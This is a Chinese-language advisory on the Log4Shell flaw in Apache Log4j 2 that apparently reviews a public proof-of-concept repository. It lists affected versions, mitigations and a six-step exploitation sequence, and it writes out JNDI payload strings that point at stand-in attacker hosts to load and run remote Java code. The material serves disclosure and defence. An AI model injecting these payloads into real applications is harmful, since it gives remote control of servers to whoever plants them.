## CVE-2021-44228 - Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j 2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.14.1

**利用条件:** 应用程序使用Log4j 2记录不受信任的输入，且未进行修复或缓解。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j 2中的一个远程代码执行漏洞。攻击者可以通过构造包含JNDI查找的恶意字符串，当Log4j 2记录该字符串时，会触发JNDI查找，从而从攻击者控制的LDAP服务器加载并执行恶意Java类。

**有效性：**
提供的POC代码有效。它展示了如何通过在HTTP请求头中注入`${jndi:ldap://evil.com/exploit}`这样的payload来触发漏洞。当应用程序记录User-Agent头时，Log4j 2会尝试解析该字符串，执行JNDI查找，并从evil.com加载恶意代码。

**投毒风险：**
分析提供的README.md文件，投毒风险较低，约为10%。主要风险在于以下几点：
* **依赖性风险：** 任何开源项目都存在依赖性风险。如果恶意作者控制了项目依赖的某个组件，则可能通过供应链攻击进行投毒。
* **人为因素：** 尽管README.md本身没有发现直接的恶意代码，但用户在使用过程中可能会受到误导，例如，将测试用的恶意LDAP服务器配置错误，导致意外的攻击或数据泄露。

**漏洞利用方式：**
1.  **攻击者构造恶意Payload：** 攻击者构造一个包含JNDI查找的payload，例如`${jndi:ldap://attacker.com/a}`。
2.  **注入Payload：** 攻击者将payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent、X-Forwarded-For等）、POST请求参数、WebSocket消息等。
3.  **触发日志记录：** 应用程序使用Log4j 2记录包含恶意payload的输入。
4.  **JNDI查找：** Log4j 2解析payload，执行JNDI查找，向attacker.com发起LDAP请求。
5.  **加载恶意代码：** 攻击者的LDAP服务器返回一个包含恶意Java类的响应。
6.  **远程代码执行：** Log4j 2加载并执行该Java类，导致远程代码执行。

**缓解措施：**
*   升级Log4j 2到最新版本 (>= 2.17.1)。
*   从JAR文件中删除`JndiLookup.class`。
*   设置系统属性`log4j2.formatMsgNoLookups=true`来禁用消息查找。
*   使用防火墙或出口ACL阻止出站LDAP/RMI流量。
*   在WAF/IDS规则中阻止`${jndi:` payload。

**项目地址:** [B1ack4sh/Blackash-CVE-2021-44228](https://github.com/B1ack4sh/Blackash-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)